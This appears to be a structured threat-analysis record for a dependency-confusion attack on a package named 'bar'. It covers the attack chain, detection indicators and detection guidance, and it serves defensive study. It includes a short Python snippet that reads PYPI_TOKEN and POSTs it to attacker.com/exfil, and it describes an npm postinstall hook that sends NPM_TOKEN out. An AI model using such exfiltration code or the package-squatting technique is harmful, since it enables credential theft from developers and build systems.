package_info.package_versions: >1.0.0 (any version greater than the internal version used by the target organization)
package_info.why_malicious: The public package 'bar' is malicious because it is intentionally crafted by an attacker to exploit dependency confusion. When an organization uses an internal package named 'bar' (e.g., version 1.0.0), and a public package with the same name and a higher version is published to a public repository (such as npm or PyPI), package managers may resolve dependencies to the malicious public version. This enables the attacker to execute arbitrary code on developer or CI systems, potentially exfiltrating credentials or installing additional malware.

malicious_snippets.code_behavior: At postinstall, the code accesses the NPM_TOKEN environment variable, sends its value via HTTPS POST to a hardcoded external domain, resulting in credential exfiltration.

malice_analysis.why_suspicious: The code is automatically executed during the postinstall phase, accesses sensitive environment variables (NPM_TOKEN), and transmits their values to an external, attacker-controlled server without user consent.
malice_analysis.violated_expectations: Legitimate packages should not exfiltrate environment variables or initiate outbound network requests to untrusted domains during installation.
malice_analysis.similar_legitimate_use: Some legitimate packages may perform network requests during installation to fetch dependencies or perform telemetry, but they do not access and exfiltrate sensitive credentials such as NPM_TOKEN.
key_indicators: Automatic execution via postinstall script in package.json
Access to sensitive environment variables (e.g., NPM_TOKEN)
Outbound HTTPS POST request to hardcoded, untrusted domain (attacker.com)
Presence of suspicious code in malware.js

malicious_snippets.code_snippet:
# Example (Python)
import os
import requests
creds = os.environ.get('PYPI_TOKEN')
requests.post('https://attacker.com/exfil', data={'token': creds})
malicious_snippets.code_behavior: At import-time, the code accesses the PYPI_TOKEN environment variable, sends its value via HTTPS POST to a hardcoded external domain, resulting in credential exfiltration.

malice_analysis.why_suspicious: The code executes automatically when the package is imported, accesses sensitive environment variables (PYPI_TOKEN), and exfiltrates their values to an attacker-controlled server.
malice_analysis.violated_expectations: Normal package imports should not trigger network exfiltration of secrets or access sensitive environment variables for outbound transmission.
malice_analysis.similar_legitimate_use: Some packages may check for updates or send anonymized telemetry at import-time, but they do not access and exfiltrate credentials such as PYPI_TOKEN.
key_indicators: Access to sensitive environment variables (e.g., PYPI_TOKEN)
Outbound HTTPS POST request to hardcoded, untrusted domain (attacker.com/exfil)

attack_chain.action: Attacker identifies the internal package name ('bar') used by the target organization.
attack_chain.leads_to: Attacker publishes a malicious package with the same name to a public repository.

attack_chain.action: Attacker publishes a public package named 'bar' with a higher version number than the internal package.
attack_chain.leads_to: The organization's package manager resolves the dependency to the malicious public package instead of the internal one.

attack_chain.action: Malicious code in the public package executes during installation (postinstall) or import-time, exfiltrating credentials or installing additional malware.
attack_chain.leads_to: Attacker gains access to sensitive credentials or internal systems.

behavioral_signatures: Automatic execution of code during postinstall (npm) or import-time (Python)
Access to environment variables containing credentials (e.g., NPM_TOKEN, PYPI_TOKEN)
Outbound network requests to hardcoded or untrusted domains during installation or import
file_indicators: Presence of a postinstall script in package.json referencing external scripts (e.g., malware.js)
Suspicious code in setup.py or __init__.py that accesses environment variables
References to external domains (e.g., attacker.com) in installation or import scripts
network_indicators: HTTPS POST requests to attacker-controlled domains such as attacker.com/exfil during package installation or import
Unexpected outbound network connections initiated by package installation or import processes
detection_knowledge.how_to_detect: Monitor for packages in public repositories that share names with internal-only packages and have higher version numbers. Flag packages that execute code during installation (postinstall) or import-time, especially if they access environment variables or initiate outbound network requests to untrusted domains. Use allow-lists for internal package sources and audit dependency resolution logs for unexpected source changes. Alert on any package installation or import that triggers network activity to hardcoded or untrusted domains or accesses sensitive environment variables.
